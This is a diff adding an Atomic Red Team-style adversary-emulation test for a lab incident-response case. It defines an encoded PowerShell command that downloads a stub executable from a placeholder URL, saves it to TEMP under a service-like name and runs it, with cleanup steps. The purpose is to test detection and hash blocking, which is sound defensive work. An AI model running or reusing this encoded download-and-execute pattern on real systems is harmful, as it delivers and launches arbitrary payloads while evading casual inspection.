@@ -1,0 +1,42 @@
+attack_technique: T1059.001
+display_name: 'Command and Scripting Interpreter: PowerShell'
+atomic_tests:
+  - name: Encoded PowerShell downloads and runs a harmless PE (lab IR-2026-FIN042)
+    auto_generated_guid: 7e2f1c3a-9b64-4d21-8c5e-2f0a6b3d4e15
+    description: |
+      Lab-only step 1 for case IR-2026-FIN042. A base64 -EncodedCommand PowerShell
+      process downloads a harmless stub PE over the network to disk and runs it.
+
+      No stock T1059.001 test does "encoded PowerShell -> download -> land a PE and
+      execute it" (the download tests run in memory or drop non-PE, the encoded-
+      command tests do not download), so this custom test is authored here.
+
+      The stub (payload-stub/stub.cs, built with payload-stub/build-stub.ps1) is
+      benign. Its SHA256 is promoted to a block-and-remediate custom indicator in
+      the response phase; it is blocked later only because we add its hash by hand.
+
+      Covers: encoded PowerShell (T1059.001), the network download
+      (DeviceNetworkEvents), and a PE on disk that is executed (DeviceProcessEvents).
+    supported_platforms:
+      - windows
+    input_arguments:
+      payload_url:
+        description: URL of the harmless stub PE (host it where the lab VM can reach it)
+        type: url
+        default: https://CHANGEME.blob.core.windows.net/lab/stub.exe
+      output_path:
+        description: Where the downloaded PE lands on disk
+        type: path
+        default: $env:TEMP\update-svc.exe
+    executor:
+      name: powershell
+      elevation_required: false
+      command: |
+        $inner = "Invoke-WebRequest -Uri '#{payload_url}' -OutFile '#{output_path}'; Start-Process -FilePath '#{output_path}'"
+        $enc = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($inner))
+        powershell.exe -NoProfile -EncodedCommand $enc
+      cleanup_command: |
+        $name = [IO.Path]::GetFileNameWithoutExtension("#{output_path}")
+        Stop-Process -Name $name -Force -ErrorAction Ignore
+        Remove-Item -Path "#{output_path}" -Force -ErrorAction Ignore
+        Remove-Item -Path (Join-Path $env:TEMP 'ir-fin042-stub-ran.txt') -Force -ErrorAction Ignore
